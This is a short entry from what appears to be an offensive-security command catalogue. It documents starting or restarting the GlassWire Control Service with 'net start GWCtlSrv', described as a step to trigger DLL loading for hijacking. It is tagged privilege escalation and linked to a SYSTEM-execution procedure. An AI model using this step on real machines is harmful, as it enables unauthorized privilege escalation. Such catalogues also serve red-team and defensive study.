---
id: uuid-placeholder
data: net start GWCtlSrv
tags:
  - service-management
  - privilege-escalation
type: command
output: The GlassWire Control Service service was started successfully.
executor: cmd
platforms:
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:26:22.823Z'
verified: false
validated: true
submitted: true
---
# start-glasswire-service

## Command

```cmd
net start GWCtlSrv
```

## Description

Starts the GlassWire Control Service to trigger DLL loading for hijacking exploitation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| GWCtlSrv | Service name | Yes |

## Examples

### Basic Start

```cmd
net start GWCtlSrv
```

### After Stop

```cmd
net stop GWCtlSrv && net start GWCtlSrv
```

## Expected Output

The GlassWire Control Service service was started successfully.

## Related

- [[procedures/Trigger-GlassWire-Service-for-SYSTEM-Execution]]
- [[commands/launch-glasswire-gui]]
